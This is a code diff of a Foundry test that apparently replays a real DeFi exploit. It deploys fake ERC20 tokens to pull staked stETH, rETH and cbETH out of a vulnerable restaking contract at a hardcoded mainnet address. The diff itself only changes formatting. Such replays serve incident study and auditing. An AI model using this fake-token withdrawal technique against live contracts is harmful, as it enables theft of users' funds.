@@ -13,6 +13,7 @@ import "./../interface.sol";
 // @Analysis
 // https://twitter.com/Phalcon_xyz/status/1718454835966775325
 contract MyERC20 {
+
     uint256 public totalSupply;
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
@@ -66,14 +67,18 @@ contract MyERC20 {
     function scaledBalanceToBalance(uint256 a) external returns (uint256) {
         return scaledBalanceToBal;
     }
+
 }
 
 interface Vulnerable {
+
     function withdraw(address _restakedTokenAddress, uint256 amount) external;
     function claim(uint256 withdrawerIndex) external;
+
 }
 
 interface IuniswapV3 {
+
     function token0() external view returns (address);
     function token1() external view returns (address);
     function swap(
@@ -83,9 +88,11 @@ interface IuniswapV3 {
         uint160 sqrtPriceLimitX96,
         bytes calldata data
     ) external;
+
 }
 
 contract ASTTest is Test {
+
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     Vulnerable vulnerable = Vulnerable(0xbAa87546cF87b5De1b0b52353A86792D40b8BA70);
     IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
@@ -106,12 +113,12 @@ contract ASTTest is Test {
         stakedTokens[1] = address(rETH);
         stakedTokens[2] = address(cbETH);
         deal(address(this), 0);
-        uint256[] memory balances = new uint[](3);
+        uint256[] memory balances = new uint256[](3);
         emit log_named_decimal_uint("Attacker Eth balance before attack:", address(this).balance, 18);
         for (uint8 i = 0; i < stakedTokens.length; i++) {
             uint256 staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
             balances[i] = staked_bal;
-            MyERC20 fake_token = new MyERC20(stakedTokens[i],staked_bal);
+            MyERC20 fake_token = new MyERC20(stakedTokens[i], staked_bal);
             fake_token.mint(10_000 * 1e18);
             fake_token.approve(address(vulnerable), type(uint256).max);
 
@@ -144,4 +151,5 @@ contract ASTTest is Test {
     }
 
     receive() external payable {}
+
 }
